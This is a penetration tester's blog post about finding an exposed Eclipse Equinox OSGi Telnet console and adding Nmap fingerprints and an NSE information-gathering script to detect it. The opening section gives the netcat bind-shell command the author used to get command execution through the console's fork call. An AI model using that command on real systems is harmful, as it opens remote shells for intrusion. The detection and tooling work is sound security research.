---
layout: post
title:  "OSGi Console - Gateway to (s)hell"
date:   2018-02-13 10:00:00
comments: true
categories: pentesting
---


I recently came upon a Telnet-based service that was previously unidentified by network scanning tools. This blog post describes my encounter with this service and how I used Nmap fingerprinting and scripting capabilities to add detection, and Metasploit to gain command execution on it.

### First encounter

My first encounter with this service was from a Nessus scan reporting a Telnet service on some remote host. I simply connected to it:

<pre style="background-color:black;color:white;font-family:'inconsolata';">
<b>telnet somehost.lan</b>
Trying somehost.lan...
Connected to somehost.lan.
Escape character is '^]'.
osgi>
osgi> ?
gogo: CommandNotFoundException: Command not found: ?
osgi> h
h
headers
help

osgi> help

close - shutdown and exit
   scope: equinox
--snip--
</pre>

Interesting. A few minutes of google-fu later, I found some page describing that this service is an [Eclipse Equinoxe OSGi console](https://www.eclipse.org/equinox/documents/quickstart-framework.php). I also found out that this OSGi console was used to dynamically load and execute Java based bundles such as [IBM Websphere Extremescale](https://www.ibm.com/support/knowledgecenter/en/SSTVLU_8.6.0/com.ibm.websphere.extremescale.doc/txsinstallstartplugs.html).

So far so good. I tinkered with the console and found two interesting calls:

<pre style="background-color:black;color:white;font-family:'inconsolata';">
osgi> <b>help exec</b>
exec - execute a command in a separate process and wait
   scope: equinox
   parameters:
        String   command to be executed
osgi> <b>help fork</b>
fork - execute a command in a separate process
    scope: equinox
    parameters:
        String   command to be executed
</pre>

Hosts were not hardened and netcat was already installed, so a simple `fork "nc -e /bin/sh 4444"` and my bind shell was there. This could have been the end of the story but I wanted to add detection capabilities for this service to Nmap so we could detect it easily during future tests.


### Test Environment Setup

My first step was to create a test environment on my own machine so I don't end up taking down a service on some production system by mistake. For my test environment, I needed to download the Equinoxe SDK from Eclipse website at [http://download.eclipse.org/equinox/drops/R-Oxygen.2-201711300510/index.php](http://download.eclipse.org/equinox/drops/R-Oxygen.2-201711300510/index.php).

Unzip everything and create the following directory structure by copying the right jar files from the unzipped directory:

<pre style="background-color:black;color:white;font-family:'inconsolata';">
.
├── configuration
│   └── config.ini
├── org.apache.felix.gogo.command.jar
├── org.apache.felix.gogo.runtime.jar
├── org.apache.felix.gogo.shell.jar
├── org.eclipse.equinox.console.jar
├── org.eclipse.osgi_3.12.50.v20170928-1321.jar
└── plugins
</pre>

The configuration file should contain the following entries:

{% highlight plain %}
osgi.bundles=org.eclipse.equinox.console@start, org.apache.felix.gogo.command@start, org.apache.felix.gogo.shell@start, org.apache.felix.gogo.runtime@start
eclipse.ignoreApp=true
osgi.noShutdown=true
{% endhighlight %}

Once everything was in place, I checked that it actually worked by launching it:
<pre style="background-color:black;color:white;font-family:'inconsolata';">
<b>java -jar org.eclipse.osgi_3.12.50.v20170928-1321.jar -console 5555</b>
</pre>

For those who want to follow along, you can download an install script gist I wrote. It's available at [https://gist.github.com/QKaiser/66c8a618eef2a7801c0bbb1aa43d724a](https://gist.github.com/QKaiser/66c8a618eef2a7801c0bbb1aa43d724a)

### Writing Nmap Fingerprint Rules

When fingerprinting services, Nmap executes different kind of probes (e.g. `NULL`, `GenericLines`, `GetRequest`, ...) over either TCP or UDP and then waits for a reply until a specific timeout is reached. It then compares the received data to regular expressions that are defined in a plaintext file named _nmap-service-probes_.

We will make use of the `NULL` probe and try to match what is returned by the OSGi console. The pattern matching should be a simple line like this one:

{% highlight plain %}
match telnet m|^(\r\n)*osgi>\x20$| p/Eclipse Equinoxe OSGi Shell (direct mode)/
{% endhighlight %}

I initially thought that the rule above would trigger a match, but it didn't. Let's see why by launching Wireshark and looking at what happens when we connect to the service:

![telnet_iac]({{site.url}}assets/osgi_console_telnet_iac.png)

As we can see in the output above, the service expect us to negotiate the terminal type. Given that we use Nmap's `NULL` probe we will never reach the point where IAC negotiation finish and the service present us with the `osgi> `  prompt.

The trick here is to simply use a matching rule on that Telnet payload that always stays the same (I checked on different kind of systems and operating systems) and that - from a long stare at Nmap's fingerprints - is **surprisingly unique**.

Let's get the data from Wireshark:

![telnet_iac]({{site.url}}assets/osgi_console_telnet_iac2.png)

And put it into Nmap's fingerprint file:

{% highlight plain %}
match telnet m|^\xff\xfb\x01\xff\xfb\x03\xff\xfd\x1f\xff\xfd\x18$| p/Eclipse Equinoxe OSGi Shell (direct mode)/
{% endhighlight %}


Next attempt: it works \o/

<pre style="background-color:black;color:white;font-family:'inconsolata';">
<b>$ nmap -sV -p5555 -Pn 127.0.0.1</b>

Starting Nmap 7.00 ( https://nmap.org ) at 2018-01-29 18:30 CET
Nmap scan report for localhost.localdomain (127.0.0.1)
Host is up (0.00012s latency).
PORT     STATE SERVICE VERSION
<p style="color:yellow">5555/tcp open  telnet  Eclipse Equinoxe OSGi Shell (direct mode)</p>
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds
</pre>

I later discovered that OSGi console can run in what they call "_telnetd mode_". This can be done by issuing the following command:

<pre style="background-color:black;color:white;font-family:'inconsolata';">
osgi> <b>telnetd start</b>
telnetd is running on 127.0.0.1:2019
</pre>

When connecting to the service over the _telnetd mode_ port, IAC negotiation of terminal type is not enforced and we are greeted with `osgi>` automagically. I therefore kept both matching rules:

{% highlight plain %}
match telnet m|^\xff\xfb\x01\xff\xfb\x03\xff\xfd\x1f\xff\xfd\x18$| p/Eclipse Equinoxe OSGi Shell (direct mode)/
match telnet m|^(\r\n)*osgi>\x20$| p/Eclipse Equinoxe OSGi Shell (telnetd mode)/
{% endhighlight %}

Again, a quick check with Nmap to demonstrate that it actually works:

<pre style="background-color:black;color:white;font-family:'inconsolata';">
<b>$ nmap -sV -p2019,5555 -Pn 127.0.0.1</b>

Starting Nmap 7.00 ( https://nmap.org ) at 2018-01-29 18:36 CET
Nmap scan report for localhost.localdomain (127.0.0.1)
Host is up (0.00011s latency).
PORT     STATE SERVICE VERSION
<p style="color:yellow">2019/tcp open  telnet  Eclipse Equinoxe OSGi Shell (telnetd mode)
5555/tcp open  telnet  Eclipse Equinoxe OSGi Shell (direct mode)</p>
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.64 seconds
</pre>


### Writing an NSE Script

The next idea that came to mind was to write an Nmap NSE script that would gather information from the remote system by using OSGI console's `getprop` command. Among the list of properties dumped by this command, most interesting ones are the OS version and architecture, Java runtime and VM versions, and the user running the service.

The idea behind that is to be able to execute OS dependent payloads without the need for a full blown OS version scan (I already had Metasploit in mind at the time), but most importantly check if the service runs as a privileged user.

Nmap's documentation is great but at the beginning I would have liked to have a step by step guide on how to write a script from beginning to end, so that's what I'm going to do here :)


Let's start with the usual: some imports, a description, sample output, author, licence, and categories:

{% highlight lua %}
local bin = require "bin"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local strbuf = require "strbuf"
local table = require "table"

description = [[
Gathers information (a list of server properties) from an Eclipse Equinoxe OSGi
(Open Service Gateway initiative) console.

References:
    * https://www.eclipse.org/equinox/documents/quickstart-framework.php
]]

---
-- @usage
-- nmap -p <port> <ip> --script osgi-info
--
-- @output
-- PORT   STATE SERVICE REASON
-- 5555/tcp open  telnet  Eclipse Equinoxe OSGi Shell (direct mode)
-- | osgi-info:
-- |   username: root
-- |   OS Version: Linux 4.4.0-38-generic (amd64 little endian)
-- |   Java Runtime: 1.8.0_101-b13 (Java(TM) SE Runtime Environment)
-- |_  Java VM: 25.101-b13 (Java HotSpot(TM) 64-Bit Server VM)
--

author = "Quentin Kaiser"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"

categories = {"default", "discovery", "safe", "version"}
{% endhighlight %}


The next thing you need to do is use [shortport](https://nmap.org/nsedoc/lib/shortport.html) to tell Nmap on which kind of service this script should be ran. Here we choose telnet services:

{% highlight lua %}
portrule = shortport.service('telnet')
{% endhighlight %}

You can consider the `action` function as your `main` if you were writing C code. Comments should explain everything:

{% highlight lua %}
action = function(host, port)
  local telnet_eol = "\r\n"
  local result = stdnse.output_table()

  -- osgi prompt regular expression
  local prompt_regexp = "(osgi>)"
  -- properties parsing regular expression
  local props_regexp = "([^=]+)=([^\r|^\n]*)"

  -- command to get system properties
  local props_cmd = "getprop"
  local disconnect_cmd = "disconnect"
  local confirm_cmd = "y"

  -- socket handler
  local socket = nmap.new_socket()
  local catch = function() socket:close() end
  local try = nmap.new_try(catch)

  -- connect
  try(socket:connect(host, port))
  socket:set_timeout(7500)
  data = try(socket:receive())


  -- if we receive IAC negotiations matching the signature, we negotiate
  if data == bin.pack("H", "FFFB01FFFB03FFFD1FFFFD18") then
      local nego1 = bin.pack("H", "FFFD01FFFD03FFFB1FFFFA1F003B001DFFF0FFFB18")
      local nego2 = bin.pack("H", "FFFA1800787465726D2D323536636F6C6F72FFF0")
      try(socket:send(nego1))
      try(socket:receive())
      try(socket:send(nego2))
      data = try(socket:receive())
  end

  -- we check it's actually an OSGi prompt
  if not string.match(data, prompt_regexp) then
    return stdnse.format_output(false, "Not an OSGi shell.")
  end

  -- request properties
  try(socket:send(props_cmd .. telnet_eol))
  data = try(socket:receive_buf(prompt_regexp, true))

{% endhighlight %}

It took me some time to figure this out. It basically loop over an iterator that returns all key/values matched from the properties list returned by the OSGi console and put them in an indexed array:

{% highlight lua %}
  -- we create an indexed array with key/values from properties dump
  props = {}
  for k, v in string.gmatch(data, props_regexp) do
    props[k:gsub("%s+", "")] = v
  end
{% endhighlight %}

We then store interesting data in `result`, which is an indexed array printed by Nmap as the result of our script.

{% highlight lua %}
  -- we fill our results table
  result["username"] = props["user.name"]
  result["OS Version"] = string.format(
      "%s %s (%s %s endian)", props["os.name"], props["os.version"],
      props["os.arch"], props["sun.cpu.endian"]
  )
  result["Java Runtime"] = string.format(
      "%s (%s)", props["java.runtime.version"], props["java.runtime.name"]
  )
  result["Java VM"] = string.format(
      "%s (%s)", props["java.vm.version"], props["java.vm.name"]
  )

{% endhighlight %}

Finally, we gracefully disconnect from the console like decent human beings:

{% highlight lua %}
  -- graceful disconnection
  try(socket:send(disconnect_cmd .. telnet_eol))
  try(socket:receive_buf("Disconnect from console?([^\r|^\n]*)", true))
  try(socket:send(confirm_cmd .. telnet_eol))
  try(socket:receive())
  socket:close()
  return result
end
{% endhighlight %}

That's it. Let's try it:

<pre style="background-color:black;color:white;font-family:'inconsolata';">
<b>$ nmap -sV -p 5555 --script osgi-info -Pn -n 127.0.0.1</b>
Starting Nmap 7.00 ( https://nmap.org ) at 2018-01-30 21:37 CET
Nmap scan report for 127.0.0.1
Host is up (0.00015s latency).
PORT     STATE SERVICE VERSION
5555/tcp open  telnet  Eclipse Equinoxe OSGi Shell (direct mode)
<p style="color:yellow">| osgi-info: 
|   username: quentin
|   OS Version: Linux 4.4.0-38-generic (amd64 little endian)
|   Java Runtime: 1.8.0_101-b13 (Java(TM) SE Runtime Environment)
|_  Java VM: 25.101-b13 (Java HotSpot(TM) 64-Bit Server VM)</p>
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
</pre>

Yay ! I'm keeping an eye on pull requests [#1123](https://github.com/nmap/nmap/pull/1123) and [#1124](https://github.com/nmap/nmap/pull/1124), hopefully my code will be included in Nmap at some point :)

### Metasploit module

I'm tidying up my Metasploit [module](https://github.com/rapid7/metasploit-framework/pull/9554) for this service at the moment. Once it lands on master I'll edit this post with more details.

### Mandatory Shodan Search

If you search for the terms "osgi" and "eclipse" on shodan, you get [23 results](https://www.shodan.io/search?query=osgi+eclipse). Please make sure you're not in charge of one of them.

![shodan]({{site.url}}assets/shodan_osgi.png)


### Conclusion

Well, this was a fun ride ! I never had the opportunity to modify Nmap to suit my needs or even needed to write NSE scripts and this new service was the perfect opportunity. The experience was so fun that I'm now looking at [open issues](https://github.com/nmap/nmap/issues) on Nmap tracker to see if I could be of any help.

As for the OSGi service in itself, it is difficult to say if pentesters will find it often during engagement. After some research, it appears that multiple software companies and software products include it. Sometimes only when a debug flag is enabled. So far I have this list of products where OSGi console is bundled with:

* WSO2 (if launched with `-DosgiConsole`) - [http://www.rukspot.com/osgiconsole.html](http://www.rukspot.com/osgiconsole.html)
* Liferay (with some modifications) - [https://web.liferay.com/web/raymond.auge/blog/-/blogs/liferay-osgi-and-shell-access-via-gogo-shell](https://web.liferay.com/web/raymond.auge/blog/-/blogs/liferay-osgi-and-shell-access-via-gogo-shell)
* TIBCO products - [https://docs.tibco.com/pub/activematrix_businessworks/6.1.1/doc/html/GUID-780D3F2B-CE92-4D1B-AD93-8DDDFCD5D690.html](https://docs.tibco.com/pub/activematrix_businessworks/6.1.1/doc/html/GUID-780D3F2B-CE92-4D1B-AD93-8DDDFCD5D690.html)
* Redhat Fuse ESB - [https://access.redhat.com/documentation/en-US/Fuse_ESB_Enterprise/7.1/html/Console_Reference/files/Consoleosgi.html](https://access.redhat.com/documentation/en-US/Fuse_ESB_Enterprise/7.1/html/Console_Reference/files/Consoleosgi.html) - It appears OSGi is used as runtime but not all features are available and only over Apache Mina SSHd implementation.
* Eclipse Kura (in debug mode ?) - [https://github.com/eclipse/kura/blob/f48bc88940a2a3f75a8d359dbfd43f75da159ecb/kura/distrib/src/main/resources/Win64-nn/start_kura_debug.bat](https://github.com/eclipse/kura/blob/f48bc88940a2a3f75a8d359dbfd43f75da159ecb/kura/distrib/src/main/resources/Win64-nn/start_kura_debug.bat)
* ...


If you have questions, do not hesitate to contact me via Twitter/Email/Comments. I'll do my best to answer them.


